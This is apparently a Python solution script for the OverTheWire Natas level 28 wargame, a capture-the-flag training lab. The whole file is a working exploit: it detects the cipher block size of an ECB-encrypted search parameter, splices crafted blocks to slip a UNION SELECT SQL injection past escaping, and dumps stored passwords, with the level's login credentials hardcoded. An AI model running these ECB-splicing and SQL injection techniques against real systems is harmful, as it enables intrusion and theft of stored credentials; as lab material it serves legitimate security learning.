#!/usr/bin/python3

import base64
import string
import urllib

from requests import Session

USERNAME = "natas28"
PASSWORD = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
URI = "http://%s.natas.labs.overthewire.org" % USERNAME
AUTH = (USERNAME, PASSWORD)


def main():
    session = Session()
    term_length_cutoffs = [1, 13, 29]
    search_query_lengths = set()
    term_length_cutoffs = []
    term_length = 1

    while len(search_query_lengths) < 3:
        response = session.post(URI, data={"query": "A" * term_length}, auth=AUTH)
        search_query = response.url.replace(URI + "/search.php/?query=", "")
        search_query_length = len(base64.b64decode(urllib.parse.unquote(search_query)))
        print("term length: ", term_length, ", response length:", search_query_length)

        if not search_query_length in search_query_lengths:
            search_query_lengths.add(search_query_length)
            term_length_cutoffs.append(term_length)

        term_length += 1

    blocksize = term_length_cutoffs[-1] - term_length_cutoffs[-2]
    print("blocksize: ", blocksize, "\n")

    for i in range(16):
        response = session.post(URI, auth=AUTH, data={"query": "A" * i})
        response_query = extract_decoded_query(response.url)
        print("query_length", i, "response_length: ", len(response_query))
        print("=" * 50)
        print_blocks(response_query, blocksize)

    query_length = 9
    response_query_block = 2  # 0 based
    response_query_block_correct_value = b"\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~"

    for char in string.printable:
        print("Attempt: ", char)
        response = session.post(
            URI, auth=AUTH, data={"query": "A" * query_length + char}
        )
        response_query = extract_decoded_query(response.url)
        block_data = extract_block_string(
            response_query, blocksize, response_query_block
        )

        if block_data == response_query_block_correct_value:
            print("WE FOUND THE CHARACTER: ", char)

            break

    # AAAAAAAAA' => AAAAAAAAA\
    injection = "A" * (query_length) + "' UNION SELECT password FROM users #"
    response = session.post(URI, auth=AUTH, data={"query": injection})
    response_query = extract_decoded_query(response.url)
    injected_query = (
        response_query[0 : (blocksize * response_query_block)]
        + response_query_block_correct_value
        + response_query[blocksize * (response_query_block + 1) :]
    )
    injected_query = base64.b64encode(injected_query)
    injected_query = urllib.parse.quote(injected_query).replace("/", "%2F")
    response = session.get(URI + "/search.php/?query=%s" % injected_query, auth=AUTH)
    print(response.text)


def extract_decoded_query(url):
    search_query = url.replace(URI + "/search.php/?query=", "")

    return base64.b64decode(urllib.parse.unquote(search_query))


def print_blocks(decoded_query, blocksize):
    for block in range(int(len(decoded_query) / blocksize)):
        data = extract_block_string(decoded_query, blocksize, block)
        print("block ", block + 1, ": ", data)
    print("")


def extract_block_string(encoded_query, blocksize, block):
    start = blocksize * block
    end = blocksize * (block + 1)

    return encoded_query[start:end]


if __name__ == "__main__":
    main()
